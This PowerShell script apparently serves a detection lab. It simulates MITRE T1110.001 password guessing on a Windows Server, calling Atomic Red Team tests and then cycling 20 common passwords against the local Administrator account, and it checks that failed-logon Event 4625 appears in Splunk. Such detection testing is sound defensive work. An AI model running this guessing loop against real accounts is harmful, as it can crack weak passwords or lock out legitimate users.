<![CDATA[# ============================================================
# Atomic Red Team Simulation: T1110 — Brute Force
# Target: Windows Server (run locally on target)
# MITRE ATT&CK: T1110.001 — Password Guessing
# ============================================================
#Requires -RunAsAdministrator

param(
    [int]$Attempts = 20,
    [string]$TargetUser = "Administrator"
)

Write-Host "=============================================" -ForegroundColor Red
Write-Host " ATTACK SIMULATION: T1110 — Brute Force" -ForegroundColor Red
Write-Host " Target User: $TargetUser" -ForegroundColor Red
Write-Host " Attempts: $Attempts" -ForegroundColor Red
Write-Host "=============================================" -ForegroundColor Red
Write-Host ""

# ── Method 1: Atomic Red Team ──
Write-Host "[*] Method 1: Atomic Red Team T1110.001..." -ForegroundColor Yellow
try {
    Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force -ErrorAction SilentlyContinue
    Invoke-AtomicTest T1110.001 -TestNumbers 1,2 -ErrorAction SilentlyContinue
    Write-Host "[✓] Atomic Red Team tests completed" -ForegroundColor Green
} catch {
    Write-Host "[!] Atomic Red Team not installed, using manual simulation" -ForegroundColor Yellow
}

# ── Method 2: Manual Failed Login Simulation ──
Write-Host ""
Write-Host "[*] Method 2: Simulating $Attempts failed RDP login attempts..." -ForegroundColor Yellow

$passwords = @(
    "password123", "admin", "letmein", "welcome1", "qwerty",
    "123456", "Password1", "abc123", "monkey", "master",
    "dragon", "login", "princess", "football", "shadow",
    "sunshine", "trustno1", "iloveyou", "batman", "access"
)

for ($i = 1; $i -le $Attempts; $i++) {
    $pw = $passwords[($i - 1) % $passwords.Count]
    Write-Host "  [Attempt $i/$Attempts] Trying password: $pw" -ForegroundColor Gray

    $securePassword = ConvertTo-SecureString $pw -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential($TargetUser, $securePassword)

    try {
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c echo test" -Credential $credential -ErrorAction Stop -WindowStyle Hidden
    } catch {
        # Expected: authentication failure generates Event 4625
    }

    Start-Sleep -Milliseconds 500
}

Write-Host ""
Write-Host "[✓] Brute force simulation complete" -ForegroundColor Green
Write-Host "[*] Check Splunk: index=wineventlog EventCode=4625" -ForegroundColor Cyan
Write-Host ""

# ── Verification ──
Write-Host "[*] Recent failed logon events:" -ForegroundColor Yellow
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 5 |
    Select-Object TimeCreated, @{N='Account';E={$_.Properties[5].Value}}, @{N='Source';E={$_.Properties[19].Value}} |
    Format-Table -AutoSize
]]>
